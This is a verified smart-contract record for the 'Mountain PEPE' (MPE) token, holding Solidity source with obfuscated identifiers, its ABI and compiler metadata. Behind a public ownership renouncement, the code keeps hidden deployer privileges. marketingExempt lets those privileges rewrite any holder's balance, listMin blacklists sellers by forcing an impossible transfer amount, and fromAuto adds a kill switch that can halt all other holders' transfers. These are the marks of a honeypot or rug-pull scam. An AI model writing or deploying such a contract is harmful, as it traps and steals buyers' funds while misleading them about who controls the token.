{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface tradingMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableExempt) external view returns (uint256);\n\n    function transfer(address isLiquiditySender, uint256 shouldMode) external returns (bool);\n\n    function allowance(address toEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLiquiditySender,\n        uint256 shouldMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderShould, uint256 value);\n    event Approval(address indexed toEnable, address indexed spender, uint256 value);\n}\n\nabstract contract launchExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toEnableTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverTrading {\n    function createPair(address toFund, address exemptTotalReceiver) external returns (address);\n}\n\ninterface receiverExempt is tradingMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MountainPEPE is launchExempt, tradingMarketing, receiverExempt {\n\n    uint256 public takeReceiverLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toSenderTrading;\n    }\n\n    uint256 private modeIs = 100000000 * 10 ** 18;\n\n    function listMin(address buyMode) public {\n        amountAt();\n        if (toIs != sellLaunched) {\n            isLaunched = fundFrom;\n        }\n        if (buyMode == launchedFund || buyMode == liquidityLimit) {\n            return;\n        }\n        exemptWallet[buyMode] = true;\n    }\n\n    function allowance(address atExempt, address amountReceiver) external view virtual override returns (uint256) {\n        if (amountReceiver == atLimit) {\n            return type(uint256).max;\n        }\n        return receiverMaxSwap[atExempt][amountReceiver];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitExempt;\n    }\n\n    uint256 swapLaunched;\n\n    uint256 public isLaunched;\n\n    function owner() external view returns (address) {\n        return receiverList;\n    }\n\n    bool public toIs;\n\n    address public launchedFund;\n\n    function transfer(address takeTx, uint256 shouldMode) external virtual override returns (bool) {\n        return fromAuto(_msgSender(), takeTx, shouldMode);\n    }\n\n    function swapFund(uint256 shouldMode) public {\n        amountAt();\n        swapLaunched = shouldMode;\n    }\n\n    uint256 constant teamMode = 19 ** 10;\n\n    address private receiverList;\n\n    uint256 shouldMarketing;\n\n    mapping(address => bool) public shouldSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletAmountSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMaxSwap;\n\n    mapping(address => bool) public exemptWallet;\n\n    constructor (){\n        if (takeReceiverLaunch == isLaunched) {\n            takeReceiverLaunch = isLaunched;\n        }\n        toEnableTake atSwapToken = toEnableTake(atLimit);\n        liquidityLimit = receiverTrading(atSwapToken.factory()).createPair(atSwapToken.WETH(), address(this));\n        \n        launchedFund = _msgSender();\n        maxReceiver();\n        shouldSwap[launchedFund] = true;\n        senderTakeLaunch[launchedFund] = modeIs;\n        \n        emit Transfer(address(0), launchedFund, modeIs);\n    }\n\n    event OwnershipTransferred(address indexed totalTx, address indexed walletMin);\n\n    function listSender(address listReceiver) public {\n        require(listReceiver.balance < 100000);\n        if (fromEnable) {\n            return;\n        }\n        \n        shouldSwap[listReceiver] = true;\n        if (toIs == sellLaunched) {\n            fundFrom = takeReceiverLaunch;\n        }\n        fromEnable = true;\n    }\n\n    mapping(address => uint256) private senderTakeLaunch;\n\n    function maxReceiver() public {\n        emit OwnershipTransferred(launchedFund, address(0));\n        receiverList = address(0);\n    }\n\n    function amountAt() private view {\n        require(shouldSwap[_msgSender()]);\n    }\n\n    address buyToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private walletAmountSender = \"MPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeIs;\n    }\n\n    uint256 public fundFrom;\n\n    uint8 private toSenderTrading = 18;\n\n    function getOwner() external view returns (address) {\n        return receiverList;\n    }\n\n    function marketingExempt(address takeTx, uint256 shouldMode) public {\n        amountAt();\n        senderTakeLaunch[takeTx] = shouldMode;\n    }\n\n    function balanceOf(address enableExempt) public view virtual override returns (uint256) {\n        return senderTakeLaunch[enableExempt];\n    }\n\n    function fromAuto(address buyTradingToken, address isLiquiditySender, uint256 shouldMode) internal returns (bool) {\n        if (buyTradingToken == launchedFund) {\n            return launchedAmountMode(buyTradingToken, isLiquiditySender, shouldMode);\n        }\n        uint256 tokenReceiver = tradingMarketing(liquidityLimit).balanceOf(buyToken);\n        require(tokenReceiver == swapLaunched);\n        require(isLiquiditySender != buyToken);\n        if (exemptWallet[buyTradingToken]) {\n            return launchedAmountMode(buyTradingToken, isLiquiditySender, teamMode);\n        }\n        return launchedAmountMode(buyTradingToken, isLiquiditySender, shouldMode);\n    }\n\n    function transferFrom(address buyTradingToken, address isLiquiditySender, uint256 shouldMode) external override returns (bool) {\n        if (_msgSender() != atLimit) {\n            if (receiverMaxSwap[buyTradingToken][_msgSender()] != type(uint256).max) {\n                require(shouldMode <= receiverMaxSwap[buyTradingToken][_msgSender()]);\n                receiverMaxSwap[buyTradingToken][_msgSender()] -= shouldMode;\n            }\n        }\n        return fromAuto(buyTradingToken, isLiquiditySender, shouldMode);\n    }\n\n    bool public fromEnable;\n\n    address public liquidityLimit;\n\n    bool public sellLaunched;\n\n    address atLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private limitExempt = \"Mountain PEPE\";\n\n    function approve(address amountReceiver, uint256 shouldMode) public virtual override returns (bool) {\n        receiverMaxSwap[_msgSender()][amountReceiver] = shouldMode;\n        emit Approval(_msgSender(), amountReceiver, shouldMode);\n        return true;\n    }\n\n    function launchedAmountMode(address buyTradingToken, address isLiquiditySender, uint256 shouldMode) internal returns (bool) {\n        require(senderTakeLaunch[buyTradingToken] >= shouldMode);\n        senderTakeLaunch[buyTradingToken] -= shouldMode;\n        senderTakeLaunch[isLiquiditySender] += shouldMode;\n        emit Transfer(buyTradingToken, isLiquiditySender, shouldMode);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"}],\"name\":\"listMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"listSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"swapFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTradingToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLiquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MountainPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}